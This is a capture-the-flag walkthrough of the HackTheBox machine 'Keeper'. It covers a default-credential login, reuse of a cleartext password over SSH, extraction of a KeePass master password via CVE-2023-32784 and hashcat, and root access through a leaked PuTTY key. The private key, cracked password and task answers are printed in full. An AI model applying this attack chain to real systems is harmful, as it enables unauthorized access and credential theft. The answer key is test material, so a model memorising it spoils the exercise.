---
title: "HackTheBox - Keeper"
published: true
---

| Field            | Details                                                                                                                                   |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                                                                     |
| **Difficulty**   | Easy                                                                                                                                      |
| **Release Date** | 2023-08-12                                                                                                                                |
| **Pwned Date**   | 2026-04-30                                                                                                                                |
| **Tags**         | `CVE-2023-32784` `Keepass Dump` `Keepass2john` `Nginx` `Password Cracking` `PuTTY` `Request Tracker` `Subdirectory Enumeration` `hashcat` |

## Summary

Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Exploring the service, we are able to see clear text credentials that lead to SSH access. With SSH access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the Keepass database, we can access the root SSH keys, which are used to gain a privileged shell on the host.

## Reconnaissance

Start with a general sweep of all TCP ports

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt 10.129.229.41
```

```
[snip]
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
[snip]
```

Run a more thourough scan on detected ports

```bash
nmap -sC -sV -p 22,80 -oN service_scan.txt 10.129.229.41
```

```
[snip]
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[snip]
```

The website on port 80 shows only a link to http://tickets.keeper.htb/rt/ which does not work.
Even trying http://10.129.229.41/rt/ with the actual ip does not work because this is not (only) a dns resolution issue.
The issue is that nginx uses something called "server blocks" and requests are mapped to the correct site based on domain name (Host header). So requests need to contain the "tickets.keeper.htb" domain in the Host header. This can be fixed by adding an entry to the /etc/hosts file: this way the attacking machine will be able to resolve the domain AND the request will contain the needed information for nginx to route the request properly.

Add the following line to /etc/hosts file

```bash
10.129.229.41   tickets.keeper.htb
```

Now the link works and allow access to the login page of a "Request Tracker" service, which is a open source ticketing system.

A quick search allows to find the default credentials for this service:
user: 'root'
password: 'password'

Try to login with these. They were not changed so it works.

Under the Admin>Users page another user can be found. Among the ui's fields there are a couple of interesting ones:

```
"Unix login": "lnorgaard"
"comments about this user": "New user. Initial password set to Welcome2023!"
```

## Foothold

The credentials found in the ticketing app can be used to establish a ssh connection with user lnorgaard

```bash
ssh lnorgaard@10.129.229.41
```

When prompted use the password from the "comments" field

```bash
lnorgaard@keeper:~$ whoami
lnorgaard
```

Got access as "lnorgaard" user.

## Privilege Escalation

In the /home/lnorgaard folder a "RT30000.zip" file can be found.

```bash
unzip -l RT30000.zip
```

```
[snip]
253395188  2023-05-24 12:51   KeePassDumpFull.dmp
3630  2023-05-24 12:51   passcodes.kdbx
```

The archive contains .kdbx file which is a secure, encrypted database used by KeePass Password Safe and a dump file of the keepass process.

There is a known vulnerability related to keepass dumps: CVE-2023-32784. It should allow to extract the master password of the db from the dump. Let's try to use it on the recovered files and see if they are vulnerable.

There is an existing tool to exploit this vulnerability: https://github.com/JorianWoltjer/keepass-dump-extractor

On the target machine unzip the file and start a python server in the same directory

```bash
lnorgaard@keeper:~$ python3 -m http.server
```

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Fetch the files on the attacking machine from http://10.129.229.41:8000/

Install the dump extractor tool

```bash
sudo apt install cargo
cargo install keepass-dump-extractor
```

Extract a wordlist of possible master passwords from the dump

```bash
/home/<YOUR_USER>/.cargo/bin/keepass-dump-extractor KeePassDumpFull.dmp -f all > wordlist.txt
```

Extract the hash from the keepass db to a form usable with hashcat

```bash
keepass2john passcodes.kdbx > passwords.kdbx.hash
```

Crack the hash with hashcat and the wordlist previously generated

```bash
hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
```

```
[snip]
$keepass$26000005d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea708500fa5a52622ab89b0addfedd5a05c411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc:rødgrød med fløde
[snip]
```

Hashcat successfully cracked the master password which is **rødgrød med fløde**

Install a keepass client to access the db

```bash
sudo apt install keepassxc
```

Open the db file

```bash
keepassxc passcodes.kdbx
```

This launches a gui and prompts for the password, use the cracked password to open it.

The Network tab contains an entry with username 'root'. In the notes of this entry a putty ssh key can be found

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

This key can be converted to a openssh format and used with the ssh command.

First save the key in a 'my-putty-key.ppk' file

Install tools for the key conversion

```bash
sudo apt install putty-tools
```

Convert the .ppk file to openssh format

```bash
puttygen ./my-putty-key.ppk -o mykey.openssh -O private-openssh-new
```

Use the created 'mykey.openssh' key to establish a ssh connection with the 'root' user

```bash
ssh -i mykey.openssh root@10.129.229.41
```

```bash
root@keeper:~# whoami
root
```

Got root access.

## Tasks

Task 1: How many open TCP ports are listening on Keeper? **2**  
Task 2: What is the default password for the default user on Request Tracker (RT)? **password**  
Task 3: Besides root, what other user is in RT? **lnorgaard**  
Task 4: What is the lnorgaard user's password on Keeper? **Welcome2023!**  
Task 6: What is the 2023 CVE ID for a vulnerability in KeePass that allows an attacker access to the database's master password from a memory dump? **CVE-2023-32784**  
Task 7: What is the master password for passcodes.kdbx? **rødgrød med fløde**  
Task 8: What is the first line of the "Notes" section for the entry in the database containing a private SSH key? **PuTTY-User-Key-File-3: ssh-rsa**
